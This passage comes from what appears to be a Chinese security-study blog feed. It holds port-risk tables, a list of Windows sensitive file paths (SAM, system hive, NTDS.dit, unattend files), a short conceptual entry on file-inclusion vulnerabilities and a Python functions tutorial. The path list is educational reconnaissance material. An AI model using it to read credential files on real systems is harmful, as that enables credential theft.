</thead>
<tbody><tr>
<td align="center">53</td>
<td align="center">DNS域名系统</td>
<td align="center">允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td align="center">67、68</td>
<td align="center">DHCP服务</td>
<td align="center">劫持、欺骗</td>
</tr>
<tr>
<td align="center">161</td>
<td align="center">SNMP协议</td>
<td align="center">爆破、搜集目标内网信息</td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">512、513、514</td>
<td align="center">Linux rexec服务</td>
<td align="center">爆破、远程登录</td>
</tr>
<tr>
<td align="center">873</td>
<td align="center">rsync服务</td>
<td align="center">匿名访问、文件上传</td>
</tr>
<tr>
<td align="center">2181</td>
<td align="center">ZooKeeper服务</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">3690</td>
<td align="center">SVN服务</td>
<td align="center">svn泄露、未授权访问</td>
</tr>
<tr>
<td align="center">8069</td>
<td align="center">Zabbix服务</td>
<td align="center">远程执行、SQL注入</td>
</tr>
<tr>
<td align="center">9200、9300</td>
<td align="center">Elasticsearch服务</td>
<td align="center">远程执行</td>
</tr>
<tr>
<td align="center">11211</td>
<td align="center">Memchached服务</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">50000</td>
<td align="center">SAP Management Console</td>
<td align="center">远程执行</td>
</tr>
</tbody></table>
<h2 id="Windows-敏感路径"><a href="#Windows-敏感路径" class="headerlink" title="Windows 敏感路径"></a>Windows 敏感路径</h2><h3 id="Windows-系统敏感文件"><a href="#Windows-系统敏感文件" class="headerlink" title="Windows 系统敏感文件"></a>Windows 系统敏感文件</h3><table>
<thead>
<tr>
<th align="center">文件名</th>
<th align="center">说明</th>
<th align="center">路径</th>
<th align="center">存在版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">boot.ini</td>
<td align="center">启动引导程序文件</td>
<td align="center">C:\boot.ini</td>
<td align="center">&lt;= 2003</td>
</tr>
<tr>
<td align="center">hosts</td>
<td align="center">域名解析文件</td>
<td align="center">C:\Windows\System32\drivers\etc\hosts</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">SAM</td>
<td align="center">存储密码文件</td>
<td align="center">C:\Windows\System32\config\SAM</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">system</td>
<td align="center">系统配置文件</td>
<td align="center">C:\Windows\System32\config\system</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">ntds.dit</td>
<td align="center">AD域数据库</td>
<td align="center">C:\Windows\NTDS\NTDS.dit</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">Autounattend.xml</td>
<td align="center">应答文件</td>
<td align="center">C:\windows\panther\unattended.xml</td>
<td align="center">全版本</td>
</tr>
<tr>
<td align="center">Autoexec.bat</td>
<td align="center">引导可执行文件</td>
<td align="center">C:\autoexec.bat</td>
<td align="center">&lt;= 98</td>
</tr>
<tr>
<td align="center">win.ini</td>
<td align="center">基本系统配置文件</td>
<td align="center">C:/Windows/win.ini</td>
<td align="center">全版本</td>
</tr>
</tbody></table>
<p><strong>boot.ini 启动引导程序文件</strong></p>
<p>在新的Windows版本中使用命令 bcdedit 代替</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\boot.ini</span><br></pre></td></tr></table></figure>



<p><strong>hosts 域名解析文件</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>



<p><strong>SAM 存储密码文件</strong></p>
<p>是注册表<code>HKEY_LOCAL_MACHINE\SAM</code>的存储文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 旧版本</span></span><br><span class="line">C:\windows\repair\SAM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新版本</span></span><br><span class="line">%SystemRoot%\system32\config\SAM</span><br><span class="line">C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>



<p><strong>system 系统配置文件</strong></p>
<p>是注册表<code>HKEY_LOCAL_MACHINE\System</code>的存储文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\system32\config\system</span><br><span class="line">C:\Windows\System32\config\system</span><br></pre></td></tr></table></figure>



<p><strong>ntds.dit AD域数据库</strong></p>
<p>包含有域用户、域组、用户hash等信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\ntds\ntds.dit</span><br><span class="line">C:\Windows\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>



<p><strong>Autounattend.xml 应答文件</strong></p>
<p>通过文件中的配置，达到Windows 无人值守安装，默认不存在</p>
<p>在Windows安装启动时，会搜索解析名为unattended.xml的文件，实现无人值守安装，免去手工选择设置</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br><span class="line"></span><br><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure>



<p><strong>Autoexec.bat 引导可执行文件</strong></p>
<p>在操作系统启动时自动执行</p>
<p>包含了操作系统环境参数，驱动加载，启动信息等参数</p>
<p>只在基于MS-DOS运行的操作系统中适用</p>
<ul>
<li>MS-DOS</li>
<li>Windows 3.x</li>
<li>Windows 95</li>
<li>Windows 98</li>
<li>Windows ME</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\autoexec.bat</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>//c6e96e4efcf5.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文件包含是指当前脚本文件可通过include等函数，导入其他文件的代码到本文件引发的漏洞。</p>
<p>如果“其他文件”可以是本地文件（本机上的文件）那就是本地文件包含漏洞，如果“其他文件”可以远程文件（其他机器上的文件）那就是远程文件包含漏洞。也就是说这两种漏洞产生的位置是一样的，只是因为利用形式不同才把他们区分开来</p>
<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>本地包含漏洞可以查看本地敏感文件</p>
<p>本地包含漏洞可以配置文件上传漏洞执行恶意代码</p>
<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>远程文件包含漏洞可以包含执行远程主机上的恶意代码</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>文件包含漏洞</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-函数</title>
    <url>//a7d380d29206.html</url>
    <content><![CDATA[<h2 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h2><p>​        通过将一段有规律的、重复的代码定义为函数，来达到一次编写、多次调用的目的。使用函数可以提高代码的重复利用率。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="function"><span class="keyword">def</span> 函数名(<span class="params">形参<span class="number">1</span>,形参<span class="number">2</span>,形参<span class="number">3.</span>..形参n</span>)</span></span><br><span class="line"><span class="function">	代码块</span></span><br><span class="line"><span class="function"># 定义形参就相当于声明了变量，但是不赋值</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">调用函数</span></span><br><span class="line"><span class="function">函数对象(<span class="params">实参</span>)</span></span><br><span class="line"><span class="function"># 形参可以指定默认值，当用户没有指定形参时，默认值才会生效</span></span><br><span class="line"><span class="function"># 在定义函数时，可以在形参前面加上一个*，这样这个形参就会获取到所有的实参，保存在一个元组中</span></span><br></pre></td></tr></table></figure>



<h2 id="实参的传递方式"><a href="#实参的传递方式" class="headerlink" title="实参的传递方式"></a>实参的传递方式</h2><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><p>位置参数就是将对应位置的实参复制给对应位置的形参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>



<h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>当形参指定了默认值，并且该形参没有赋值，使用默认值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(a=<span class="number">1</span>,b=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 当c没有赋值时，使用默认值c=10</span></span><br></pre></td></tr></table></figure>



<h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>使用形式参数的名字来确定输入的参数值。通过此方式指定函数实参时，不再需要与形参的位置完全一致，只要将参数名写正确即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(c=<span class="number">3</span>,b=<span class="number">2</span>,a=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># *形参只能接收位置参数，而不能接收关键字参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,*c</span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># **形参可以接收其他的关键字参数，它会将这些参数统一保存到一个字典中</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">fn</span>(<span class="params">a,b,**c</span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params">a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>,d=<span class="number">4</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">d</span> = &#123;&#x27;<span class="title">a</span>&#x27;:</span><span class="number">100</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">200</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">300</span>&#125;</span><br><span class="line">fn(**d)</span><br></pre></td></tr></table></figure>



<h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>)</span></span><br><span class="line"><span class="function">变量 = (<span class="params"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params">*变量</span>)</span></span><br><span class="line"><span class="function">变量 = (<span class="params">a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params">**变量</span>)</span></span><br><span class="line"><span class="function">#可以是任意序列或者字典，个数与形参一样，字典用**表示</span></span><br></pre></td></tr></table></figure>



<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>​        在Python中，可以在函数体内使用return语句为函数指定返回值，为函数设置返回值的作用就是将函数的处理结果返回给调用它的函数。该返回值可以是任意类型，并且无论return语句出现在函数的什么位置，只要得到执行，就会直接结束函数的执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn2</span>() :</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> fn2()</span><br><span class="line">fn()</span><br><span class="line"><span class="comment"># 这个函数的执行结果就是它的返回值，也可以 变量 = fn()</span></span><br><span class="line"><span class="comment"># return后面可以跟任意形式的值，return后的代码都不会执行，可以用来结束函数</span></span><br></pre></td></tr></table></figure>



<h2 id="文档字符串"><a href="#文档字符串" class="headerlink" title="文档字符串"></a>文档字符串</h2><p>文档字符串就是一个函数的使用说明</p>
<p>可以使用<code>help()</code>函数查看该函数的使用说明</p>
<p>使用三引号创建文档字符串</p>
<h2 id="作用域（scope）"><a href="#作用域（scope）" class="headerlink" title="作用域（scope）"></a>作用域（scope）</h2><p>作用域就是指变量生效的区域，在执行时创建，在执行结束时销毁</p>
<p><strong>全局作用域</strong></p>
<p>所有函数以外的区域都是全局作用域，可以在程序的任意位置被访问</p>
<p><strong>函数作用域</strong></p>
<p>在函数作用域中定义的变量，都是局部变量，它只能在函数内部被访问</p>
<p><strong>可以使用 global 变量，来声明变量是全局变量</strong></p>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>每一个作用域都会有一个它对应的命名空间，是一个专门用来存储变量的字典</p>
<p>全局命名空间，用于保存全局变量。函数命名空间用来保存函数中的变量</p>
<p><code>locals()</code>用来获取当前作用域的命名空间，返回的是一个字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">变量 = <span class="built_in">locals</span>()</span><br><span class="line"><span class="comment"># 当前命名空间</span></span><br><span class="line"><span class="built_in">globals</span>()</span><br><span class="line"><span class="comment"># 函数可以用来在任意位置获取全局命名空间</span></span><br></pre></td></tr></table></figure>



<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>递归（Recursion），就是指在函数的定义中使用函数自身的方法</p>
<p>如果函数中包含了对自身的调用，该函数就是使用了递归的方法</p>
<p>函数自己调用自己，和循环类似</p>
<p>它的整体思想是，将一个大问题分解为一个个的小问题，直到问题无法分解时，再去解决问题</p>
<p>递归函数的两个要件</p>
<ul>
<li>基线条件：确定递归到何时终止，函数不在调用自己</li>
<li>递归条件：将问题继续分解的条件</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例1：判断任意数的阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">n</span>):</span></span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> n * fn(n-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(fn(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例2：判断是否为回文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">n</span>) :</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(n) &lt; <span class="number">2</span> :</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">elif</span> n[<span class="number">0</span>] != n[-<span class="number">1</span>] :</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> fn1(n[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="string">&#x27;abcdcba&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h2 id="匿名函数（lambda）"><a href="#匿名函数（lambda）" class="headerlink" title="匿名函数（lambda）"></a>匿名函数（lambda）</h2><p>lambda函数表达式专门用来创建一些简单的函数，可以创建一次性的函数，不需要为函数命名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">lambda</span> 参数列表 : 返回值</span><br><span class="line"></span><br><span class="line">r = (<span class="keyword">lambda</span> a,b : a+b)(<span class="number">10</span>,<span class="number">20</span>)</span><br><span class="line">fn = <span class="keyword">lambda</span> a,b : a+b</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(fn(<span class="number">10</span>,<span class="number">20</span>))</span><br></pre></td></tr></table></figure>



<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>接收函数作为参数，或者将函数作为返回值的函数是高阶函数</p>
<p>当我们使用一个函数作为参数时，实际上是将指定的代码传递进了目标函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># 把判断传参是否是2的倍数，如果是返回True，否则返回False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">func,lst</span>):</span></span><br><span class="line">    new_list = []</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="keyword">if</span> func(n):</span><br><span class="line">            new_list.append(n)</span><br><span class="line">    <span class="keyword">return</span> new_list</span><br><span class="line"><span class="comment"># 遍历形参lst,如果n传入形参func函数的结果为True,则把n传入新列表，最后返回新列表</span></span><br><span class="line"><span class="built_in">print</span>(fn(fn2,l))</span><br><span class="line"><span class="comment"># 调用函数fn,把函数fn2传入形参func,把列表l传入形参lst</span></span><br></pre></td></tr></table></figure>



<h2 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h2><p><code>filter()</code>用于过滤序列，过滤掉不符合条件的元素</p>
<p><code>filter()</code>函数本身不对序列作任何修改</p>
<p><code>filter()</code>函数返回的结果是一个迭代器对象</p>
<p>接收两个参数，第一个为函数，第二个为序列，序列的每个元素作为参数传递给函数进行判断，然后返回 True 或 False，最后将返回 True 的元素放到新列表中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment">#  1.函数，根据该函数来过滤序列（可迭代的结构）</span></span><br><span class="line"><span class="comment">#  2.需要过滤的序列（可迭代的结构）</span></span><br><span class="line"><span class="comment"># 返回值：</span></span><br><span class="line"><span class="comment">#   过滤后的新序列（可迭代的结构）</span></span><br><span class="line"></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn2</span>(<span class="params">n</span>) :</span></span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line">r = <span class="built_in">filter</span>(fn2,l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(r))</span><br></pre></td></tr></table></figure>



<h2 id="map-函数"><a href="#map-函数" class="headerlink" title="map()函数"></a>map()函数</h2><p><code>map()</code>会根据提供的函数对指定序列做映射</p>
<p><code>map()</code>函数返回的结果是一个迭代器对象</p>
<p>用来通过函数修改列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="built_in">map</span>(函数,列表)</span><br><span class="line"></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">a = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line">b = <span class="built_in">map</span>(a,l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(b))</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]</span><br></pre></td></tr></table></figure>



<h2 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h2><p>通过<code>sort()</code>函数对序列排序</p>
<p>在<code>sort()</code>可以接收一个关键字参数 ，key</p>
<p>key需要一个函数作为参数，当设置了函数作为参数</p>
<p>每次都会以列表中的一个元素作为参数来调用函数，并且使用函数的返回值来比较元素的大小</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">a.sort(key=fn)</span><br><span class="line"><span class="comment"># 这里通过函数fn()获取到列表的第二位</span></span><br><span class="line"><span class="comment"># 2,4,1,3</span></span><br><span class="line"><span class="comment"># 然后通过列表的sort()方法对2,4,1,3做默认升序排序</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">[(<span class="number">4</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure>



<h2 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h2><p>这个函数和<code>sort()</code>的用法基本一致，但是sorted()可以对任意的序列进行排序</p>
<p>并且使用sorted()排序不会影响原来的对象，而是返回一个新对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">2</span>,<span class="number">5</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>]</span><br><span class="line">l = <span class="string">&quot;123765816742634781&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(l,key=<span class="built_in">int</span>))</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>, <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]</span><br></pre></td></tr></table></figure>



<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>将函数作为返回值返回，也是一种高阶函数,叫做闭包</p>
<p>通过闭包可以创建一些只有当前函数能访问的变量</p>
<p>可以将一些私有的数据藏到的闭包中</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">直接调用函数</button></li><li class="tab"><button type="button" data-href="#-2">返回函数名称</button></li><li class="tab"><button type="button" data-href="#-3">利用闭包保存变量的值</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(a+b+c)</span><br><span class="line">    fn1(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>)</span><br><span class="line">fn(<span class="string">&quot;name&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(a+b+c)</span><br><span class="line">    <span class="keyword">return</span> fn1</span><br><span class="line">	<span class="comment"># 此处不直接调用，而是返回函数名称（Python中一切皆对象）</span></span><br><span class="line">fn2 = fn(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="comment"># 调用包装器</span></span><br><span class="line">fn2(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>)</span><br><span class="line"><span class="comment"># 调用内部函数</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用闭包之前</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    num = num + a</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (b &lt; <span class="number">5</span>):</span><br><span class="line">    fn(<span class="number">1</span>)</span><br><span class="line">    b += <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># 当我们不希望num这个序列被更改时，可以添加一个函数（闭包），让作用域变成函数作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    num = <span class="number">1</span>	<span class="comment"># 这里num只能通过fn1()来看到</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a</span>):</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num	<span class="comment"># 因为作用域，num不能直接被更改，使用nonlocal使上级作用域可以被更改</span></span><br><span class="line">        num = num + a	</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="keyword">return</span> fn1	<span class="comment">#让函数fn1作为返回值返回</span></span><br><span class="line">fn2 = fn()	<span class="comment"># 这里fn2的作用是调用fn()后返回的函数</span></span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (b &lt; <span class="number">5</span>):</span><br><span class="line">    fn2(<span class="number">1</span>)</span><br><span class="line">    b += <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="comment"># 使用闭包后,局部变量num的值就会保存下来,而不是每次调用函数后销</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    num = []	<span class="comment"># 如果num是列表，可以使用列表方法来更改，不需要nonlocal</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a</span>):</span></span><br><span class="line">        num.append(a)</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> fn1</span><br><span class="line">fn2 = fn()</span><br><span class="line"><span class="built_in">print</span>(fn2(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>在不修改原函数的情况下，对原函数进行修改</p>
